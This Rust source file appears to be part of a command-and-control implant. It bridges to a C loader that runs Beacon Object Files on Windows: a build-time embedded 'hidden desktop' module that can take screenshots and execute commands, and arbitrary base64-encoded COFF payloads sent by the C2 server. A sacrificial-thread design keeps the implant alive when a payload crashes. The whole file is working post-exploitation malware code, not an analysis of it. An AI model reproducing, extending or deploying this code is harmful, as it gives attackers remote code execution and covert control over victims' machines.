//! bof_bridge.rs — Rust FFI bridge to the C BOF/COFF loader
//!
//! ┌─────────────────────────────────────────────────────────────────────┐
//! │ AGENT-INTERNAL MODULE — yeh BOF file NAHI hai, yeh agent ka         │
//! │ execution machinery hai (BOF arsenal ke saare C sources + .o        │
//! │ outputs root ke `bofs/` workspace me rehte hain).                   │
//! └─────────────────────────────────────────────────────────────────────┘
//!
//! C loader        : <repo-root>/bofs/loader/bof_loader.c   (build.rs links it)
//! Embedded BOF    : <repo-root>/bofs/bofs_src/hidden_desktop.c
//!                   (build.rs compiles → bofs/bofs_out/hidden_desktop.x64.o
//!                    → include_bytes! at build time)
//! Runtime BOFs    : server-provided COFF via task JSON (execute_bof_json)
//!
//! Two execution paths:
//!   1. execute_hidden_desktop_bof() — build-time embedded BOF (hdesktop cmd)
//!   2. execute_bof_json()           — generic: any x64 COFF from the C2
//!     args JSON: {"coff": "<b64 of .o>", "args": "<b64 packed args>"}
//!     Packed-args format: [4B LE argc][4B len][data]... (BeaconParseArgv)

#[derive(Debug)]
pub struct BofResult {
    pub output: String,
    pub success: bool,
}

#[cfg(all(target_os = "windows", feature = "cffi"))]
extern "C" {
    fn bof_load_and_run(
        coff_data: *const u8, coff_size: usize,
        args_data: *const u8, args_size: usize,
        output_buf: *mut u8, output_size: usize,
    ) -> i32;
}

/// Embedded hidden_desktop BOF (compiled at build time by build.rs)
/// Empty if BOF compilation failed or feature disabled.
/// build.rs ALWAYS sets HIDDEN_DESKTOP_BOF env var (real BOF or placeholder).
/// env!() returns a compile-time string literal — required by include_bytes!.
/// If env var is not set at all, build.rs always sets it to the placeholder,
/// so this is safe.
#[cfg(all(target_os = "windows", feature = "cffi"))]
const HIDDEN_DESKTOP_BOF: &[u8] = include_bytes!(env!("HIDDEN_DESKTOP_BOF"));

/// Execute hidden_desktop BOF with given args.
/// Args format: "start" | "screenshot" | "list" | "stop" | "exec <cmd>"
#[allow(unused_variables)]
pub fn execute_hidden_desktop_bof(args: &str) -> (String, String) {
    #[cfg(all(target_os = "windows", feature = "cffi"))]
    {
        if HIDDEN_DESKTOP_BOF.is_empty() {
            return (
                String::new(),
                "BOF not available (compilation failed or cffi disabled)\n".into(),
            );
        }

        let mut output_buf = vec![0u8; 64 * 1024];
        let args_bytes = args.as_bytes();

        let result = unsafe {
            bof_load_and_run(
                HIDDEN_DESKTOP_BOF.as_ptr(),
                HIDDEN_DESKTOP_BOF.len(),
                args_bytes.as_ptr(),
                args_bytes.len(),
                output_buf.as_mut_ptr(),
                output_buf.len(),
            )
        };

        if result < 0 {
            return (
                String::new(),
                format!("BOF execution failed (code: {})\n", result),
            );
        }

        let output = String::from_utf8_lossy(
            &output_buf[..(result as usize).min(output_buf.len())]
        ).into_owned();

        (output, String::new())
    }

    #[cfg(not(all(target_os = "windows", feature = "cffi")))]
    {
        let _ = args;
        (
            String::new(),
            "BOF: cffi disabled or not windows — using inline fallback\n".into(),
        )
    }
}

/// Generic BOF execution from JSON args (server-provided COFF)
#[allow(unused_variables)]
pub fn execute_bof_json(args_json: &str) -> (String, String) {
    #[cfg(all(target_os = "windows", feature = "cffi"))]
    {
        let v: serde_json::Value = match serde_json::from_str(args_json) {
            Ok(v) => v,
            Err(e) => return (String::new(), format!("parse bof args: {}", e)),
        };
        let coff_b64 = v.get("coff").and_then(|s| s.as_str()).unwrap_or("");
        let args_b64 = v.get("args").and_then(|s| s.as_str()).unwrap_or("");
        let coff_data = match crate::core_agent::commu::comms::base64_decode(coff_b64) {
            Some(d) => d,
            None => return (String::new(), "bad coff base64".into()),
        };
        if coff_data.len() < 2 { return (String::new(), "coff too small".into()); }
        let machine = u16::from_le_bytes([coff_data[0], coff_data[1]]);
        if machine != 0x8664 { return (String::new(), format!("not x64 COFF (0x{:04X})", machine)); }
        let args_data = crate::core_agent::commu::comms::base64_decode(args_b64).unwrap_or_default();
        let mut output_buf = vec![0u8; 64 * 1024];
        let result = unsafe {
            bof_load_and_run(coff_data.as_ptr(), coff_data.len(),
                args_data.as_ptr(), args_data.len(),
                output_buf.as_mut_ptr(), output_buf.len())
        };
        // v6 loader return-code mapping — negative codes are ALL contained
        // failures (the sacrificial-thread loader never lets a BOF fault
        // kill the agent), so they surface as readable errors, not crashes.
        if result < 0 {
            let msg = match result {
                -1 => "BOF rejected: invalid COFF or no `go` entry point",
                -2 => "BOF rejected: unsupported relocation in executable section",
                -3 => "BOF rejected: unresolved external symbol (BOF needs an API the loader does not provide)",
                -4 => "BOF CRASHED — contained on sacrificial thread, agent survived, memory wiped",
                -5 => "BOF internal error (thread/wait failure)",
                -6 => "BOF timed out (>2 min) — sacrificial thread terminated, agent survived",
                _  => "BOF execution failed",
            };
            return (String::new(), format!("{}\n", msg));
        }
        let output = String::from_utf8_lossy(&output_buf[..(result as usize).min(output_buf.len())]).into_owned();
        (output, String::new())
    }
    #[cfg(not(all(target_os = "windows", feature = "cffi")))]
    { (String::from("BOF: cffi disabled or not windows"), String::new()) }
}
